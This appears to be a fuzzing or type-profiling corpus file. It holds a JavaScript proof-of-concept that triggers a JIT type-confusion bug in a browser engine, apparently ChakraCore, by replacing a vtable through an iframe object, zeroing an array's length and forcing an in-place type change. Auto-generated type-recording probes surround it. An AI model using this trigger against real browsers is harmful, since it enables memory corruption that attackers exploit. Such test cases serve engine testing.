var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
try { if (Inst0 <= 1000 && typeof (opt) != "undefined") {_RecordType("<9,12,1>",(opt)); Inst0++; } } catch(e) {}
function opt(x_obj, arr) {
try { if (Inst1 <= 1000 && typeof (x_obj) != "undefined") {_RecordType("<13,18,1>",(x_obj)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (arr) != "undefined") {_RecordType("<20,23,1>",(arr)); Inst2++; } } catch(e) {}
  arr[0] = 1.1;
try { if (Inst3 <= 1000 && typeof (arr[0]) != "undefined") {_RecordType("<29,35,2>",(arr[0])); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (arr) != "undefined") {_RecordType("<29,32,2>",(arr)); Inst4++; } } catch(e) {}
try { if (Inst7 <= 1000 && typeof (arr) != "undefined") {_RecordType("<55,58,3>",(arr)); Inst7++; } } catch(e) {}
  x_obj.a = arr; // Replacing the vtable.
try { if (Inst5 <= 1000 && typeof (x_obj.a) != "undefined") {_RecordType("<45,52,3>",(x_obj.a)); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (x_obj) != "undefined") {_RecordType("<45,50,3>",(x_obj)); Inst6++; } } catch(e) {}

  arr['leng' + 'th'] = 0; // The length changes, but the BailOutOnInvalidatedArrayHeadSegment check will think that it's not an array. So no bailout will happen.
try { if (Inst8 <= 1000 && typeof (arr['leng' + 'th']) != "undefined") {_RecordType("<88,106,5>",(arr['leng' + 'th'])); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (arr) != "undefined") {_RecordType("<88,91,5>",(arr)); Inst9++; } } catch(e) {}

  arr[0] = 2.3023e-320;
try { if (Inst10 <= 1000 && typeof (arr[0]) != "undefined") {_RecordType("<251,257,7>",(arr[0])); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (arr) != "undefined") {_RecordType("<251,254,7>",(arr)); Inst11++; } } catch(e) {}
}

try { if (Inst13 <= 1000 && typeof (document.body.appendChild(document.createElement('iframe')).contentWindow.eval) != "undefined") {_RecordType("<288,366,10>",(document.body.appendChild(document.createElement('iframe')).contentWindow.eval)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (document.body.appendChild(document.createElement('iframe')).contentWindow) != "undefined") {_RecordType("<288,361,10>",(document.body.appendChild(document.createElement('iframe')).contentWindow)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (document.body.appendChild) != "undefined") {_RecordType("<288,313,10>",(document.body.appendChild)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (document.body) != "undefined") {_RecordType("<288,301,10>",(document.body)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (document) != "undefined") {_RecordType("<288,296,10>",(document)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (document.createElement) != "undefined") {_RecordType("<314,336,10>",(document.createElement)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (document) != "undefined") {_RecordType("<314,322,10>",(document)); Inst19++; } } catch(e) {}
let x_obj = document.body.appendChild(document.createElement('iframe')).contentWindow.eval('({})');
try { if (Inst12 <= 1000 && typeof (x_obj) != "undefined") {_RecordType("<280,285,10>",(x_obj)); Inst12++; } } catch(e) {}
let arr = [1.1, 1.1];
try { if (Inst20 <= 1000 && typeof (arr) != "undefined") {_RecordType("<380,383,11>",(arr)); Inst20++; } } catch(e) {}

for (let i = 0; i < 10000; i++) {
try { if (Inst21 <= 1000 && typeof (i) != "undefined") {_RecordType("<408,409,13>",(i)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (i) != "undefined") {_RecordType("<415,416,13>",(i)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (i) != "undefined") {_RecordType("<426,427,13>",(i)); Inst23++; } } catch(e) {}
try { if (Inst24 <= 1000 && typeof (opt) != "undefined") {_RecordType("<435,438,14>",(opt)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (x_obj) != "undefined") {_RecordType("<439,444,14>",(x_obj)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (arr.concat) != "undefined") {_RecordType("<446,456,14>",(arr.concat)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (arr) != "undefined") {_RecordType("<446,449,14>",(arr)); Inst27++; } } catch(e) {}
  opt(x_obj, arr.concat());
}

try { if (Inst28 <= 1000 && typeof (opt) != "undefined") {_RecordType("<464,467,17>",(opt)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (x_obj) != "undefined") {_RecordType("<468,473,17>",(x_obj)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (arr) != "undefined") {_RecordType("<475,478,17>",(arr)); Inst30++; } } catch(e) {}
opt(x_obj, arr);
arr[1] = {}; // in-place type conversion
try { if (Inst31 <= 1000 && typeof (arr[1]) != "undefined") {_RecordType("<481,487,18>",(arr[1])); Inst31++; } } catch(e) {}try { if (Inst32 <= 1000 && typeof (arr) != "undefined") {_RecordType("<481,484,18>",(arr)); Inst32++; } } catch(e) {}

try { if (Inst33 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<523,534,20>",(console.log)); Inst33++; } } catch(e) {}try { if (Inst34 <= 1000 && typeof (console) != "undefined") {_RecordType("<523,530,20>",(console)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (arr) != "undefined") {_RecordType("<535,538,20>",(arr)); Inst35++; } } catch(e) {}
console.log(arr);

